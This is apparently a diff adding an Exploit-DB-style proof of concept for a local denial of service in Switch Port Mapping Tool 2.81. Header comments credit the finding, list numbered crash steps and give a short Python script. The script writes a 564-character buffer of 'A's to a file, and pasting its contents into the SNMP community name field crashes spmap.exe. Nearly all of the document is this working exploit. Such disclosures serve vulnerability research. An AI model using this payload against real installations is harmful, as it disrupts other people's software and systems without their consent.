@@ -1,0 +1,24 @@
+# Exploit Title: Switch Port Mapping Tool 2.81 - 'SNMP Community Name' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-07-27
+# Vendor Homepage: https://switchportmapper.com/
+# Software Link : http://download.switchportmapper.com/spm281.zip
+# Tested Version: 2.81
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python Managed_Switch_Port_Mapping_Tool_2.81.py
+# 2.- Open Managed_Switch_Port_Mapping_Tool_2.81.txt and copy content to clipboard
+# 3.- Open spmap.exe
+# 4.- Switch Group > Settings
+# 6.- Paste ClipBoard on "SNMP v1/v2c Read Community Name"
+# 7.- OK
+# 8.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 564
+f = open ("Managed_Switch_Port_Mapping_Tool_2.81.txt", "w")
+f.write(buffer)
+f.close()
